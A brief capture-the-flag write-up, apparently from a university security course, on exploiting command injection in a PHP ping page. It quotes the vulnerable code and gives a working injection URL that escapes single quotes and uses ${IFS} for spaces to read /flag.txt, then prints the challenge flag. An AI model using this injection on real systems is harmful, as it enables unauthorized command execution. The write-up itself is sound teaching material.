# Ping Me

This was a command injection challenge. The source was provided on this one. The goal was to read the flag at /flag.txt The application was designed to ping an IP. In examining the source, there's something peculiar. There isn't any formal string escaping. For one thing, spaces aren't allowed.

`if (strpos($ip, " ")) {
die("Spaces not allowed in the IP!");
}`

And since the input was put into single quotes (`$cmd = "ping -c1 -t1 '$ip'";`), the only way to achieve command injection was to break out of single quotes.

`http://offsec-chalbroker.osiris.cyber.nyu.edu:1244/?ip=8.8.8.8\\%27;cat${IFS}/flag.txt;%23&debug=1`

The flag was:

`flag{f33l_fr33_2_nuk3_th3_b0x_:)_9de7b668959a}`
